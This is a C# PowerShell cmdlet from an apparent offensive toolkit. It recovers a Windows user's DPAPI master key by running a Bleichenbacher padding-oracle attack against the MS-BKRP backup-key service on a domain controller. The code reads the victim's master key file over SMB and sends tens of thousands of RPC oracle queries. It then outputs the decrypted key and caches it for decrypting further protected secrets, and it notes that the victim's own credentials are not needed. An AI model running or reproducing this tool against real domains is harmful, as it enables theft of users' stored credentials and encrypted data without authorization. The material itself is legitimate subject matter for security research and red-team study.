using System;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboDpapiMasterKeyBkrpResult
	{
		public string DomainController { get; init; } = string.Empty;
		public string? MasterKeyFile { get; init; }
		public string? MasterKeyGuid { get; init; }
		public string? MasterKey { get; init; }
		public string? MasterKeyHash { get; init; }
		public long OracleQueries { get; init; }
		public string? FailureReason { get; init; }
	}

	/// <summary>
	/// Recovers a DPAPI master key from a domain-joined machine's master key file
	/// by exploiting the PKCS#1 v1.5 padding oracle in the MS-BKRP service on a DC.
	///
	/// Prerequisites:
	///   - You must hold the target user's master key FILE (e.g. via Backup Operator
	///     privileges or a readable roaming-profile share).
	///   - The master key file must contain a DomainKey block (domain-joined machine).
	///   - Any valid domain credential is sufficient to query the DC oracle;
	///     the victim user's credentials are NOT required.
	///   - This technique contacts the domain controller directly, not the target host.
	///
	/// The attack sends tens of thousands of RPC queries to the DC's
	/// \PIPE\protected_storage endpoint. Use QueryThrottleMs to reduce DC load
	/// at the cost of longer running time. Expect 15–60 minutes for a 2048-bit key.
	/// </summary>
	[Cmdlet(VerbsLifecycle.Invoke, "TBODpapiMasterKeyBkrp")]
	[OutputType(typeof(TboDpapiMasterKeyBkrpResult))]
	public sealed class InvokeTBODpapiMasterKeyBkrp : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string DomainController { get; set; } = string.Empty;

		// Master key file bytes — accepts pipeline from Get-TBODpapiMasterKeyLocations
		// or any byte[] source.
		[Parameter(Mandatory = true, ParameterSetName = "Bytes", ValueFromPipelineByPropertyName = true)]
		public byte[]? MasterKeyBytes { get; set; }

		// Alternatively read the master key file from the target over SMB.
		[Parameter(Mandatory = true, ParameterSetName = "Path")]
		public string? ServerName { get; set; }

		[Parameter(Mandatory = true, ParameterSetName = "Path")]
		public string? MasterKeyPath { get; set; }

		[Parameter]
		public string? ShareName { get; set; } = DpapiMasterKeyLocator.DefaultShareName;

		// GUID of the master key (informational, used for cache population).
		[Parameter(ValueFromPipelineByPropertyName = true)]
		public string? MasterKeyGuid { get; set; }

		// ── Oracle query pacing ──────────────────────────────────────────────────────
		// Artificial inter-query delay in milliseconds (0 = no throttle).
		// Increasing this reduces DC load at the cost of proportionally longer runtime.
		[Parameter]
		[ValidateRange(0, 60_000)]
		public int QueryThrottleMs { get; set; } = 0;

		// Retries on transient transport errors (not on oracle false/true responses).
		[Parameter]
		[ValidateRange(0, 10)]
		public int MaxRetries { get; set; } = 3;

		// Base delay before the first retry; doubles with each subsequent attempt.
		[Parameter]
		[ValidateRange(0, 30_000)]
		public int RetryBaseDelayMs { get; set; } = 500;

		// Hard upper bound on total oracle queries (safety valve against infinite loops).
		[Parameter]
		[ValidateRange(1_000, 1_000_000)]
		public int MaxOracleQueries { get; set; } = 300_000;

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var dcName = DpapiHelpers.NormalizeServerName(this.DomainController);
			if (string.IsNullOrWhiteSpace(dcName))
				throw new ArgumentException("DomainController must be provided.", nameof(this.DomainController));

			// 1. Obtain the raw master key file bytes.
			byte[] rawMkFile;
			string? mkFilePath = null;

			if (this.MasterKeyBytes != null && this.MasterKeyBytes.Length > 0)
			{
				rawMkFile = this.MasterKeyBytes;
			}
			else if (!string.IsNullOrWhiteSpace(this.ServerName) && !string.IsNullOrWhiteSpace(this.MasterKeyPath))
			{
				var serverName = DpapiHelpers.NormalizeServerName(this.ServerName!);
				mkFilePath = this.MasterKeyPath;
				try
				{
					rawMkFile = DpapiHelpers.ReadFileBytes(smb, UncPath.Parse(mkFilePath), cancellationToken);
				}
				catch (Exception ex)
				{
					this.WriteObject(new TboDpapiMasterKeyBkrpResult
					{
						DomainController = this.DomainController,
						MasterKeyFile = mkFilePath,
						MasterKeyGuid = this.MasterKeyGuid,
						FailureReason = $"Failed to read master key file from {mkFilePath}: {ex.Message}"
					});
					return;
				}
			}
			else
			{
				throw new ArgumentException(
					"Provide either MasterKeyBytes or both ServerName and MasterKeyPath.");
			}

			// 2. Parse the master key file and validate the DomainKey block.
			DpapiMasterKeyFile mkFile;
			try
			{
				mkFile = DpapiMasterKeyCrypto.ParseMasterKeyFile(rawMkFile);
			}
			catch (Exception ex)
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = this.MasterKeyGuid,
					FailureReason = $"Failed to parse master key file: {ex.Message}"
				});
				return;
			}

			if (mkFile.DomainKey == null)
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = this.MasterKeyGuid ?? mkFile.Guid?.ToString(),
					FailureReason = "Master key file does not contain a DomainKey block. " +
						"The machine may not be domain-joined, or this is a machine-scope key."
				});
				return;
			}

			var masterKeyGuid = this.MasterKeyGuid
				?? mkFile.Guid?.ToString()
				?? mkFile.GuidText?.Trim().Trim('{', '}');

			var domainKey = mkFile.DomainKey;

			this.WriteVerbose(
				$"Invoke-TBODpapiMasterKeyBkrp: DomainKey v{domainKey.Version}, " +
				$"backup key GUID {domainKey.BackupKeyGuid}, " +
				$"RSA ciphertext {domainKey.SecretData.Length} bytes.");

			this.WriteWarning(
				$"Invoke-TBODpapiMasterKeyBkrp: Starting Bleichenbacher attack against {dcName}. " +
				$"This will send up to {this.MaxOracleQueries:N0} RPC queries to \\PIPE\\protected_storage. " +
				$"Expected runtime: 15–60+ minutes for a 2048-bit key. " +
				(this.QueryThrottleMs > 0
					? $"Query throttle: {this.QueryThrottleMs} ms."
					: "No inter-query throttle (use -QueryThrottleMs to reduce DC load)."));

			// 3. Open the BKRP session to the DC.
			BkrpSession bkrpSession;
			try
			{
				bkrpSession = smb.OpenBkrpSessionAsync(dcName, cancellationToken).GetAwaiter().GetResult();
			}
			catch (Exception ex)
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = masterKeyGuid,
					FailureReason = $"Failed to open BKRP session on {dcName}: {ex.Message}"
				});
				return;
			}

			// 4. Run the Bleichenbacher oracle attack.
			long finalQueryCount = 0;
			byte[]? masterKey = null;
			string? failureReason = null;

			using (bkrpSession)
			{
				var oracleOptions = new BkrpOracleOptions
				{
					QueryThrottleMs = this.QueryThrottleMs,
					MaxRetries = this.MaxRetries,
					RetryBaseDelayMs = this.RetryBaseDelayMs,
					MaxOracleQueries = this.MaxOracleQueries
				};

				var progressHandler = new Progress<BleichenbacherProgress>(p =>
				{
					finalQueryCount = p.OracleQueries;
					this.WriteVerbose(
						$"[BKRP oracle] Step {p.Step}: {p.OracleQueries} queries, " +
						$"{p.IntervalsRemaining} interval(s)" +
						(p.BitRangeRemaining > 0 ? $", {p.BitRangeRemaining} bits remaining" : "") +
						$" — {p.Message}");
				});

				try
				{
					masterKey = DomainKeyDecryption.DecryptMasterKeyAsync(
						bkrpSession, domainKey, oracleOptions, progressHandler, cancellationToken)
						.GetAwaiter().GetResult();
				}
				catch (OperationCanceledException)
				{
					failureReason = "Cancelled.";
				}
				catch (Exception ex)
				{
					failureReason = ex.Message;
					this.LogException(smb, "Invoke-TBODpapiMasterKeyBkrp oracle attack failed", ex, emitWarning: false);
				}
			}

			// 5. Emit result.
			if (masterKey != null && masterKey.Length > 0)
			{
				var masterKeyHash = SHA1.HashData(masterKey);
				var masterKeyHex = masterKey.ToHexString();

				// Populate the session-wide cache so downstream DPAPI blob decryption works.
				if (!string.IsNullOrWhiteSpace(masterKeyGuid)
					&& Guid.TryParse(masterKeyGuid, out var parsedMasterKeyGuid))
				{
					TboDpapiMasterKeyCache.TrySet(smb, dcName, parsedMasterKeyGuid, masterKey);
				}

				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = masterKeyGuid,
					MasterKey = masterKeyHex,
					MasterKeyHash = masterKeyHash.ToHexString(),
					OracleQueries = finalQueryCount
				});
			}
			else
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = masterKeyGuid,
					OracleQueries = finalQueryCount,
					FailureReason = failureReason ?? "Unknown failure."
				});
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}
	}
}
